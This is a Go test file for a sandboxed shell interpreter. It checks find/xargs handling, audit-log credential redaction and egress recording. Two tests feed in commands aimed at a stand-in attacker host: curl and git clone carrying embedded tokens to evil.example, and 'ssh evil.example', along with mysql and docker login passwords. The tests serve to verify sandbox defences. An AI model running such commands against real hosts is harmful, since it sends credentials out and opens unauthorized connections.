package sandbox

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rezen/smash/internal/command"
	"mvdan.cc/sh/v3/expand"
)

func TestFindExecIterates(t *testing.T) {
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "d"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "d", "f"), []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	var out, er bytes.Buffer
	var records []AuditRecord
	cfg := NewConfig(root, root, expand.ListEnviron("PATH=/usr/bin:/bin"))
	cfg.Stdout, cfg.Stderr = &out, &er
	cfg.Auditor = AuditorFunc(func(r AuditRecord) { records = append(records, r) })
	if err := Run(cfg, "test", `find d -type f -exec chmod +x {} \;`); err != nil {
		t.Fatalf("run: %v; stderr %s", err, er.String())
	}
	info, err := os.Stat(filepath.Join(root, "d", "f"))
	if err != nil || info.Mode()&0111 == 0 {
		t.Fatalf("file not executable: %v, %v", info, err)
	}
	finds, chmods := 0, 0
	for _, r := range records {
		if r.Name == "find" {
			finds++
		}
		if r.Name == "chmod" {
			chmods++
			if len(r.Wrappers) == 0 || r.Wrappers[0] != "find" {
				t.Errorf("chmod wrappers: %v", r.Wrappers)
			}
		}
	}
	if finds != 1 || chmods != 1 {
		t.Errorf("records: find %d, chmod %d: %+v", finds, chmods, records)
	}
}

func TestXargsIterates(t *testing.T) {
	out, er, err := runConfined(t, `printf 'a\nb\n' | xargs -n1 echo`)
	if err != nil || out != "a\nb\n" {
		t.Fatalf("out %q, err %v, stderr %s", out, err, er)
	}
}

func TestFindUnsupportedActionRefused(t *testing.T) {
	_, er, err := runConfined(t, `find . -exec echo {} \; -exec echo {} \;`)
	if err == nil || !strings.Contains(er, "unsupported action combination") {
		t.Fatalf("err %v, stderr %q", err, er)
	}
}

func TestAuditNeverLogsCredentials(t *testing.T) {
	var audit bytes.Buffer
	_, stderr, _ := runConfined(t, `
curl https://u:TOKEN@evil.example/x || true
git clone https://x:TOKEN@evil.example/a/b || true
mysql -pTOKEN -h db.example || true
docker login -u u -p TOKEN registry.example || true
`, func(c *Config) { c.Auditor = TextAuditor(&audit) })
	if strings.Contains(audit.String(), "TOKEN") || strings.Contains(stderr, "TOKEN") {
		t.Fatalf("credential leaked:\naudit:\n%s\nstderr:\n%s", audit.String(), stderr)
	}
}

func TestNilStdinDoesNotPanic(t *testing.T) {
	for _, script := range []string{"sha256sum", "base64", "sha256sum -c"} {
		t.Run(script, func(t *testing.T) {
			root := t.TempDir()
			var out, er bytes.Buffer
			cfg := NewConfig(root, root, expand.ListEnviron("PATH=/usr/bin:/bin"))
			cfg.Stdin, cfg.Stdout, cfg.Stderr = nil, &out, &er
			_ = Run(cfg, "test", script)
		})
	}
}

func TestServedLayerAndEgressRecord(t *testing.T) {
	var records []AuditRecord
	_, _, _ = runConfined(t, `sh -c '/usr/bin/true'; mktemp; ssh evil.example`, func(c *Config) {
		c.Auditor = AuditorFunc(func(r AuditRecord) { records = append(records, r) })
	})
	want := map[string]string{"sh": "sh-interp", "mktemp": "tool-mktemp", "ssh": "egress"}
	for _, r := range records {
		if expected, ok := want[r.Name]; ok {
			if r.Served != expected {
				t.Errorf("%s served by %q, want %q", r.Name, r.Served, expected)
			}
			delete(want, r.Name)
		}
		if r.Name == "ssh" && (r.Egress == nil || r.Egress.Kind != command.EgressEndpoint || r.Egress.Target != "evil.example") {
			t.Errorf("ssh egress = %+v", r.Egress)
		}
	}
	if len(want) > 0 {
		t.Errorf("missing records: %v", want)
	}
}
